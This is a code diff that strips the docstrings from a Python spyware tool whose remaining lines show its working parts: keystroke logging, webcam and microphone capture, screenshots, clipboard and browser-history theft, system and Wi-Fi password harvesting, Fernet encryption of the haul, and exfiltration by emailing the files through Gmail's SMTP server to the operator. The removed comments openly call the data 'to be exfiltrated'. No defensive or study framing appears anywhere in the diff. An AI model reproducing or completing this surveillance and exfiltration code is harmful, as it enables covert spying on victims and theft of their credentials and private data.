@@ -37,14 +37,7 @@ if os.name == 'nt':
 
 
 def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
-    """
-    Facilitates sending the emails with the encrypted data to be exfiltrated.
-
-    :param email_address:  The Gmail account associated where the encrypted data will be sent.
-    :param password:  The application password generated in Gmail users Google account
-    :param email:   The email message instance to be sent.
-    :return:  Nothing
-    """
+    
     try:
         # Initiate Gmail SMTP session #
         with smtplib.SMTP('smtp.gmail.com', 587) as session:
@@ -62,13 +55,7 @@ def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
 
 
 def email_attach(path: Path, attach_file: str) -> MIMEBase:
-    """
-    Creates email attach object and returns it.
-
-    :param path:  The file path containing files to be attached.
-    :param attach_file: The name of the file to be attached.
-    :return:  The populated email attachment instance.
-    """
+    
     # Create the email attachment object #
     attach = MIMEBase('application', "octet-stream")
     attach_path = path / attach_file
@@ -85,13 +72,7 @@ def email_attach(path: Path, attach_file: str) -> MIMEBase:
 
 
 def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
-    """
-    Format email header and add message in body.
-
-    :param message:  The email message instance.
-    :param email_address:  The Gmail account associated where the encrypted data will be sent.
-    :return:
-    """
+    
     message['From'] = email_address
     message['To'] = email_address
     message['Subject'] = 'Success!!!'
@@ -101,13 +82,7 @@ def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
 
 
 def send_mail(path: Path, re_obj: object):
-    """
-    Facilitates sending emails in a segmented fashion based on regex matches.
-
-    :param path:  The file path containing the files to be attached to the email.
-    :param re_obj:  Compiled regex instance containing precompiled patterns for file extensions.
-    :return:  Nothing
-    """
+  
     # User loging information #
     email_address = ''          # <--- Enter your email address
     password = ''               # <--- Enter email password
@@ -147,13 +122,7 @@ def send_mail(path: Path, re_obj: object):
 
 
 def encrypt_data(files: list, export_path: Path):
-    """
-    Encrypts all the file data in the parameter list of files to be exfiltrated.
-
-    :param files:  List of files to be encrypted.
-    :param export_path:  The file path where the files to be encrypted reside.
-    :return:  Nothing
-    """
+    
     # In the python console type: from cryptography.fernet import Fernet ; then run the command
     # below to generate a key. This key needs to be added to the key variable below as
     # well as in the DecryptFile.py that should be kept on the exploiter's system. If either
@@ -188,9 +157,7 @@ def encrypt_data(files: list, export_path: Path):
 
 
 class RegObject:
-    """
-    Regex object that contains numerous compiled expressions grouped together.
-    """
+    
     def __init__(self):
         # Compile regex's for attaching files #
         self.re_xml = re.compile(r'.{1,255}\.xml$')
@@ -206,12 +173,7 @@ class RegObject:
 
 
 def webcam(webcam_path: Path):
-    """
-    Captures webcam pictures every five seconds.
-
-    :param webcam_path:  The file path where the webcam pictures will be stored.
-    :return:  Nothing
-    """
+    
     # Create directory for webcam picture storage #
     webcam_path.mkdir(parents=True, exist_ok=True)
     # Initialize video capture instance #
@@ -235,12 +197,7 @@ def webcam(webcam_path: Path):
 
 
 def microphone(mic_path: Path):
-    """
-    Actively records microphone in 60 second intervals.
-
-    :param mic_path:  The file path where the microphone recordings will be stored.
-    :return:  Nothing
-    """
+    
     # Import sound recording module in private thread #
     from scipy.io.wavfile import write as write_rec
     # Set recording frames-per-second and duration #
@@ -268,12 +225,7 @@ def microphone(mic_path: Path):
 
 
 def screenshot(screenshot_path: Path):
-    """
-    Captured screenshots every five seconds.
-
-    :param screenshot_path:  The file path where the screenshots will be stored.
-    :return:  Nothing
-    """
+    
     # Create directory for screenshot storage #
     screenshot_path.mkdir(parents=True, exist_ok=True)
 
@@ -289,12 +241,7 @@ def screenshot(screenshot_path: Path):
 
 
 def log_keys(key_path: Path):
-    """
-    Detect and log keys pressed by the user.
-
-    :param key_path:  The file path where the pressed key logs will be stored.
-    :return:  Nothing
-    """
+   
     # Set the log file and format #
     logging.basicConfig(filename=key_path, level=logging.DEBUG,
                         format='%(asctime)s: %(message)s')
@@ -304,12 +251,7 @@ def log_keys(key_path: Path):
 
 
 def get_browser_history(browser_file: Path):
-    """
-    Get the browser username, path to browser databases, and the entire browser history.
-
-    :param browser_file:  Path to the browser info output file.
-    :return:  Nothing
-    """
+   
     # Get the browser's username #
     bh_user = bh.get_username()
     # Gets path to database of browser #
@@ -332,12 +274,7 @@ def get_browser_history(browser_file: Path):
 
 
 def get_clipboard(export_path: Path):
-    """
-    Gathers the clipboard contents and writes the output to the clipboard output file.
-
-    :param export_path:  The file path where the data to be exported resides.
-    :return:  Nothing
-    """
+    
     try:
         # Access the clipboard #
         win32clipboard.OpenClipboard()
@@ -365,13 +302,7 @@ def get_clipboard(export_path: Path):
 
 
 def get_system_info(sysinfo_file: Path):
-    """
-    Runs an array of commands to gather system and hardware information. All the output is \
-    redirected to the system info output file.
-
-    :param sysinfo_file:  The path to the output file for the system information.
-    :return:  Nothing
-    """
+    
     # If the OS is Windows #
     if os.name == 'nt':
         syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
@@ -407,14 +338,7 @@ def get_system_info(sysinfo_file: Path):
 
 
 def linux_wifi_query(export_path: Path):
-    """
-    Runs nmcli commands to query a list of Wi-Fi SSID's that the system has encountered. The SSID \
-    list is then iterated over line by line to query for each profile include passwords. All the \
-    output is redirected to the Wi-Fi info output file.
-
-    :param export_path:  The file path where the data to be exported resides.
-    :return:  Nothing
-    """
+    
     get_wifis = None
     # Format wifi output file path #
     wifi_path = export_path / 'wifi_info.txt'
